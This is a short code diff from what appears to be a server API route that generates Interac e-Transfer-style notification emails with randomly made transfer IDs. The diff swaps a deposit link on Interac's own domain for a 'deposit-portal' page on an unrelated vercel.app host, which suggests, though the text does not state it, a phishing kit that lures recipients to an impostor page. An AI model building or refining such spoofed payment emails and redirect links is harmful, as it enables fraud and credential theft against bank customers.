@@ -39,7 +39,7 @@ export async function POST(request: Request) {
 
     const transferId = `INTC-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
 
-    const depositLink = `https://brandcentre.interac.ca/member-login/`
+    const depositLink = `https://v0-interacadvancededition-git-main-nykeygpts-projects.vercel.app/deposit-portal`
 
     const emailHtml = generateInteracEmailHtml({
       recipientName,
